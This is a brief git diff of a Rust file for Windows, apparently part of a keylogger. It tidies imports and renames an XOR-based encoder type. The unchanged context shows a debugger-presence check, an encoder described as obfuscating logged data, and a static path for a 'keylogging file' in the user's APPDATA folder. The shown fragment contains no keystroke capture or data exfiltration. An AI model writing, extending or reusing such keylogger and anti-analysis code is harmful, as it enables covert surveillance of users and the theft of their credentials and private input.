@@ -1,12 +1,10 @@
 use std::fs::{self, OpenOptions};
 use std::os::windows::process::CommandExt;
-use std::process;
 use std::sync::Mutex;
 use once_cell::sync::Lazy;
 use std::io::Write;
-use crate::encode::{self, Encode};
-use std::path::{Path, PathBuf};
-// use rand::{rngs::StdRng, SeedableRng, Rng};
+use crate::encode::{EncodeFile};
+use std::path::{PathBuf};
 use windows::Win32::System::Diagnostics::Debug::IsDebuggerPresent;
 
 use windows::Win32::Foundation::{
@@ -61,7 +59,7 @@ use windows::Win32::System::Diagnostics::ToolHelp::{
 
 // creates a global xor shift to left encoder
 //randomizes key
-static ENCODER: Lazy<Mutex<encode::Encode>> = Lazy::new(|| Mutex::new(Encode::new( 42)));
+static ENCODER: Lazy<Mutex<EncodeFile>> = Lazy::new(|| Mutex::new(EncodeFile::new( 42)));
 
 static KEYLOGGING_FILE: Lazy<PathBuf> = Lazy::new(|| {
     let appdata = std::env::var("APPDATA").expect("APPDATA not found");
